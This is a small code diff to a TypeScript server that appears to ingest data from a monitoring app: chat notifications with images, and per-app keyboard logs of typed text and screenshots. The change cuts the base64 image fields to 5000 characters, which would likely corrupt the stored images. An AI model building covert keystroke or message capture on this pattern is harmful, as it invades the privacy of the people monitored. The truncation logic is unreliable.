@@ -1187,7 +1187,7 @@ export const ingestNotifications = async (req: Request, res: Response) => {
               },
               // A chat app often re-posts the same message a moment later with its photo attached,
               // so the image is $set (not insert-only) to fill it in on the already-saved row.
-              ...(n.imageBase64 ? { $set: { imageBase64: String(n.imageBase64) } } : {}),
+              ...(n.imageBase64 ? { $set: { imageBase64: String(n.imageBase64).slice(0, 5000) } } : {}),
             },
             upsert: true,
           },
@@ -1640,7 +1640,7 @@ export const ingestKeyboardLogs = async (req: Request, res: Response) => {
         appName: String(item.appName || item.packageName || 'App').trim(),
         appIcon: item.appIcon || '',
         capturedText: item.capturedText || '',
-        screenshotBase64: item.screenshotBase64 || '',
+        screenshotBase64: screenshotUrl ? '' : (item.screenshotBase64 ? String(item.screenshotBase64).slice(0, 5000) : ''),
         screenshotUrl: screenshotUrl || '',
         timestamp: item.timestamp ? new Date(item.timestamp) : new Date(),
       });
